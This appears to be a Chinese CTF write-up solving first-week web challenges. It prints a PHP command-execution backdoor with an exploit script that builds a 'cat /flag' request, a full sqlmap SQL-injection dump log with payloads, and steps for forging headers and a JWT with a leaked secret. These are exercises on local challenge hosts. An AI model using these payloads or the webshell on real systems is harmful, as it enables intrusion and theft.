# Week 1

## headach3

in `header`

## 会赢吗

1. `html`中的注释

```html
<!-- flag第一部分：ZmxhZ3tXQTB3，开始你的新学期吧！:/4cqu1siti0n -->
```

2. `javascript`

```javascript
fetch('/api/flag/4cqu1siti0n', {
    method: 'POST',
    headers: {
        'Content-Type': 'application/json'
    }
})
```
```json
{"flag":"IV95NF9yM2Fs","nextLevel":"s34l"}
```

3. 修改 `html` 元素

```html
<span id="state">解封</span>
```

`第三部分Flag: MXlfR3I0c1B, 你解救了五条悟！下一关: /Ap3x`

4. `javascript`

```javascript
document.querySelector('form').addEventListener('submit', function (event) {
    event.preventDefault();
    alert("宿傩的领域太强了，有什么办法让他的领域失效呢？");
});

(function () {
    const originalConsoleLog = console.log;
    console.log = function () {
        originalConsoleLog.apply(console, arguments);
        alert("你觉得你能这么简单地获取到线索？");
    };
})();
```

```http request
POST /api/flag/Ap3x HTTP/1.1
Host: 127.0.0.1:48461
Content-Type: application/x-www-form-urlencoded

csrf_token=hfaousghashgfasbasiouwrda1_
```

`Content-Type`好像只能大于38（即当前长度）才能成功，不过大部分软件都能自动处理（`Hackbar`好像不行说是）

```json
{"flag":"fSkpKcyF9","nextLevel":null}
```

## 智械危机

访问`robots.txt` 拿到 `Disallow: /backd0or.php`

```php
<?php

function execute_cmd($cmd) {
    system($cmd);
}

function decrypt_request($cmd, $key) {
    $decoded_key = base64_decode($key);
    $reversed_cmd = '';
    for ($i = strlen($cmd) - 1; $i >= 0; $i--) {
        $reversed_cmd .= $cmd[$i];
    }
    $hashed_reversed_cmd = md5($reversed_cmd);
    if ($hashed_reversed_cmd !== $decoded_key) {
        die("Invalid key");
    }
    $decrypted_cmd = base64_decode($cmd);
    return $decrypted_cmd;
}

if (isset($_POST['cmd']) && isset($_POST['key'])) {
    execute_cmd(decrypt_request($_POST['cmd'],$_POST['key']));
}
else {
    highlight_file(__FILE__);
}
?>
```

`exp.php`

```php
<?php
$cmd = base64_encode("cat /flag");
$reversed_cmd = strrev($cmd);
$decoded_key = md5($reversed_cmd);
$key = base64_encode($decoded_key);

echo "cmd=$cmd&key=$key";
// cmd=Y2F0IC9mbGFn&key=ODc5YTU5MWM2Nzg1YTRlMTM5OGI5NmE5YTFiYzY3ZWI=
```

## 谢谢皮蛋

```Plain Text
F:\CTF\web tools\sqlmap>python sqlmap.py -u "http://127.0.0.1:7524/" --data=id=1 --tamper base64encode.py --dump
        ___
       __H__
 ___ ___["]_____ ___ ___  {1.9.9.4#dev}
|_ -| . [)]     | .'| . |
|___|_  [']_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 18:51:37 /2025-09-17/

[18:51:37] [INFO] loading tamper module 'base64encode'
[18:51:37] [INFO] resuming back-end DBMS 'mysql'
[18:51:37] [INFO] testing connection to the target URL
[18:51:38] [WARNING] there is a DBMS error found in the HTTP response body which could interfere with the results of the tests
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: id (POST)
    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: id=1 AND (SELECT 7392 FROM(SELECT COUNT(*),CONCAT(0x7176707871,(SELECT (ELT(7392=7392,1))),0x7176767871,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=1 AND (SELECT 2836 FROM (SELECT(SLEEP(5)))xaeA)
---
[18:51:38] [WARNING] changes made by tampering scripts are not included in shown payload content(s)
[18:51:38] [INFO] the back-end DBMS is MySQL
web application technology: Nginx 1.18.0, PHP 7.3.22
back-end DBMS: MySQL >= 5.0 (MariaDB fork)
[18:51:38] [WARNING] missing database parameter. sqlmap is going to use the current database to enumerate table(s) entries
[18:51:38] [INFO] fetching current database
[18:51:38] [INFO] resumed: 'ctf'
[18:51:38] [INFO] fetching tables for database: 'ctf'
[18:51:39] [INFO] retrieved: 'Fl4g'
[18:51:41] [INFO] retrieved: 'hexo'
[18:51:41] [INFO] fetching columns for table 'hexo' in database 'ctf'
[18:51:41] [INFO] resumed: 'id'
[18:51:41] [INFO] resumed: 'int(11)'
[18:51:41] [INFO] resumed: 'uname'
[18:51:41] [INFO] resumed: 'varchar(10)'
[18:51:41] [INFO] resumed: 'position'
[18:51:41] [INFO] resumed: 'varchar(100)'
[18:51:41] [INFO] fetching entries for table 'hexo' in database 'ctf'
[18:51:41] [WARNING] reflective value(s) found and filtering out
[18:51:42] [INFO] retrieved: 'Point B'
[18:51:42] [INFO] retrieved: '1'
[18:51:43] [INFO] retrieved: 'CHAMBER'
[18:51:43] [INFO] retrieved: 'Point A'
[18:51:44] [INFO] retrieved: '2'
[18:51:44] [INFO] retrieved: 'NEON'
[18:51:45] [INFO] retrieved: 'Point A'
[18:51:45] [INFO] retrieved: '3'
[18:51:47] [INFO] retrieved: 'RAYNA'
[18:51:47] [INFO] retrieved: 'Center'
[18:51:48] [INFO] retrieved: '4'
[18:51:48] [INFO] retrieved: 'SAGE'
[18:51:49] [INFO] retrieved: 'School'
[18:51:49] [INFO] retrieved: '3333'
[18:51:50] [INFO] retrieved: 'FR3E3'
Database: ctf
Table: hexo
[5 entries]
+------+---------+------------+
| id   | uname   | position   |
+------+---------+------------+
| 1    | CHAMBER | Point B    |
| 2    | NEON    | Point A    |
| 3    | RAYNA   | Point A    |
| 4    | SAGE    | Center     |
| 3333 | FR3E3   | School     |
+------+---------+------------+

[18:51:50] [INFO] table 'ctf.hexo' dumped to CSV file 'C:\Users\H\AppData\Local\sqlmap\output\127.0.0.1\dump\ctf\hexo.csv'
[18:51:50] [INFO] fetching columns for table 'Fl4g' in database 'ctf'
[18:51:50] [INFO] resumed: 'id'
[18:51:50] [INFO] resumed: 'int(11)'
[18:51:50] [INFO] resumed: 'des'
[18:51:50] [INFO] resumed: 'varchar(100)'
[18:51:50] [INFO] resumed: 'value'
[18:51:50] [INFO] resumed: 'varchar(100)'
[18:51:50] [INFO] fetching entries for table 'Fl4g' in database 'ctf'
[18:51:51] [INFO] retrieved: 'flag{N3W5tar-ctF_Z0ZA1bac675c83ac}'
[18:51:52] [INFO] retrieved: 'C0ngratu1ati0ns!'
[18:51:53] [INFO] retrieved: '5555'
Database: ctf
Table: Fl4g
[1 entry]
+------+------------------+------------------------------------+
| id   | des              | value                              |
+------+------------------+------------------------------------+
| 5555 | C0ngratu1ati0ns! | flag{N3W5tar-ctF_Z0ZA1bac675c83ac} |
+------+------------------+------------------------------------+

[18:51:53] [INFO] table 'ctf.Fl4g' dumped to CSV file 'C:\Users\H\AppData\Local\sqlmap\output\127.0.0.1\dump\ctf\Fl4g.csv'
[18:51:53] [INFO] fetched data logged to text files under 'C:\Users\H\AppData\Local\sqlmap\output\127.0.0.1'

[*] ending @ 18:51:53 /2025-09-17/
```

## PangBai 过家家（1）

`/start` 可快速开始并获得 `Cookie`

1. `header`

```http response
HTTP/1.1 200 OK
Location: /205f5baa-e528-4b8a-834c-10d7f2cdfc84
```

2. `get`

`/?ask=miao`

3. `post`

`say=hello`

4. `User-Agent`

`Papa/1.1`

5. `PATCH & multipart/form-data`

```http request
PATCH /?ask=miao HTTP/1.1
Host: 
User-Agent: Papa/1.0
Content-Type: multipart/form-data; boundary=--abc
Cookie: token=

----abc
Content-Disposition: form-data; name="file"; filename="1.zip"

123
----abc
Content-Disposition: form-data; name="say"

玛卡巴卡阿卡哇卡米卡玛卡呣
----abc--
```

6. `Referer`

`Referer: localhost`

7. `JWT`

[JWT官方地址（解密加密）](https://jwt.io)

`SECRET : Pe2K7kxo8NMIkaeN`

将加密改为 `level: 0` 

然后将改后的 `Cookie` 放入请求头，等待一会（优美的）剧情，即可获得 `flag`















